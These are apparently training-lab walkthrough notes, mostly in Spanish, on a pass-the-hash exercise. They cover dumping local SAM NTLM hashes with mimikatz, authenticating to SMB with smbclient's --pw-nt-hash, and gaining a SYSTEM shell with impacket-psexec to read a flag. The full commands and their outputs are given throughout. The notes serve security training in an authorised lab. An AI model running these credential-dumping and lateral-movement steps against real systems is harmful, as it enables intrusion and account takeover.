# Walk: Password Attacks - Passing NTLM - VM Group 1

## Fecha: 25/02/2025
## Hosts: Windows
## IP: 192.168.244.0/24 - 192.168.244.211 - 192.168.244.212
## Objetivo
Use the methods from this section to get access to VM #2 and find the flag on the desktop of the user _Administrator_.
## Herramientas
1. hydra
2. smbclient
3. impacket
## Procedimiento y comandos
> Las Credenciales para la maquina 192.168.244.211 son provistas por offsec. _**gunther**_ / _**password123!**_

#### Paso 1: Nos conectamos por RDP y obtenemos el hash NTLM _Administrator_
1. `xfreerdp /v:192.168.244.211 /u:gunther /p:password123! +clipboard /cert:ignore /drive:/tmp`
2. Una vez dentro corremos mimikatz
```
PS C:\Windows\system32> cd C:\tools
PS C:\tools> ./mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

572     {0;000003e7} 1 D 32978          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0045142c} 2 F 5177127     FILES01\gunther S-1-5-21-1555802299-1328189896-734683769-1006   (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 5265620     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```
3. Listamos los hashes:
```
mimikatz # lsadump::sam
Domain : FILES01
SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
Local SID : S-1-5-21-1555802299-1328189896-734683769

SAMKey : 201b0e3078f2be635aaaa055ab5a7828

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
...
RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 36600e1b78cd803577d3e1bcbba8f143
...
RID  : 000003ee (1006)
User : gunther
  Hash NTLM: 8119935c5f7fa5f57135620c8073aaca
...

RID  : 000003ef (1007)
User : paul
  Hash NTLM: 57373a907ccd7196a2bad219132d615f
...
```
#### Paso 2: Nos autenticamos con el hash NTLM (Opcional)
> Este es un ejemplo de Autenticacion con un hash NTLM en un servicio SMB.
1. Elegimos una herramienta que admita autenticacion por medio del hash:
- Opciones:
	 - smbclient
	 - impacket
	 - mimikatz
> Utilizaremos smbclient con el parametro **--pw-nt-hash**
```
smbclient \\\\192.168.244.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jun  2 17:55:37 2022
  ..                                DHS        0  Tue Feb 25 17:00:23 2025
  secrets.txt                         A       16  Thu Sep  1 13:23:32 2022

                4554239 blocks of size 4096. 1601499 blocks available
smb: \> get secrets.txt
getting file \secrets.txt of size 16 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
``` 
- Desde kali:
```
┌──(kali㉿kali)-[~/OffSec/16-PasswordAttacks/16.3.2-PassingNTLM]
└─$ cat secrets.txt                                  
this is a secret    
```
#### Paso 3: Obtener un shel interactivo:
> Utilizaremos impacket-psexec: _**"Busca un recurso compartido en el que se pueda escribir y carga un archivo ejecutable en él. Luego, registra el ejecutable como un servicio de Windows y lo inicia"**_
- Ejecutamos el comando: 
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.244.212

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.244.212.....
[*] Found writable share ADMIN$
[*] Uploading file ZHQCMdPt.exe
[*] Opening SVCManager on 192.168.244.212.....
[*] Creating service EmGa on 192.168.244.212.....
[*] Starting service EmGa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname 
FILES02

C:\Windows\system32>
```
- Pasamos de estar logeados como _**gunther**_ al usuario _**Administrator**_
#### Paso 4: Buscamos el flag:
```
C:\Windows\system32> cd ..
 
C:\Windows> cd ..
 
C:\> ls
'ls' is not recognized as an internal or external command,
operable program or batch file.
 
C:\> dir
 Volume in drive C has no label.
 Volume Serial Number is 7286-2AEA

 Directory of C:\

02/25/2025  12:00 PM             2,702 output.txt
05/08/2021  12:20 AM    <DIR>          PerfLogs
06/01/2022  02:06 PM    <DIR>          Program Files
05/08/2021  01:39 AM    <DIR>          Program Files (x86)
06/02/2022  12:55 PM    <DIR>          secrets
06/20/2022  07:24 PM    <DIR>          Users
02/25/2025  01:36 PM    <DIR>          Windows
               1 File(s)          2,702 bytes
               6 Dir(s)   6,559,584,256 bytes free

C:\> cd Users
 
C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 7286-2AEA

 Directory of C:\Users

06/20/2022  07:24 PM    <DIR>          .
03/01/2023  05:32 AM    <DIR>          Administrator
06/20/2022  07:24 PM    <DIR>          anastasia
06/09/2022  11:27 AM    <DIR>          files02admin
06/01/2022  02:04 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   6,559,584,256 bytes free

C:\Users> cd Administrator
 
C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is 7286-2AEA

 Directory of C:\Users\Administrator

03/01/2023  05:32 AM    <DIR>          .
06/20/2022  07:24 PM    <DIR>          ..
06/01/2022  02:04 PM    <DIR>          3D Objects
06/01/2022  02:04 PM    <DIR>          Contacts
06/09/2022  11:19 AM    <DIR>          Desktop
06/01/2022  02:04 PM    <DIR>          Documents
06/01/2022  02:04 PM    <DIR>          Downloads
06/01/2022  02:04 PM    <DIR>          Favorites
03/01/2023  05:32 AM             1,378 lab.ps1
06/01/2022  02:04 PM    <DIR>          Links
06/01/2022  02:04 PM    <DIR>          Music
06/01/2022  02:04 PM    <DIR>          Pictures
06/01/2022  02:04 PM    <DIR>          Saved Games
06/01/2022  02:04 PM    <DIR>          Searches
06/01/2022  02:04 PM    <DIR>          Videos
               1 File(s)          1,378 bytes
              14 Dir(s)   6,559,584,256 bytes free

C:\Users\Administrator> cd Desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 7286-2AEA

 Directory of C:\Users\Administrator\Desktop

06/09/2022  11:19 AM    <DIR>          .
03/01/2023  05:32 AM    <DIR>          ..
02/25/2025  12:00 PM                38 flag.txt
               1 File(s)             38 bytes
               2 Dir(s)   6,559,584,256 bytes free

C:\Users\Administrator\Desktop> type flag.txt
OS{3a050***df2d5}

C:\Users\Administrator\Desktop> 
```
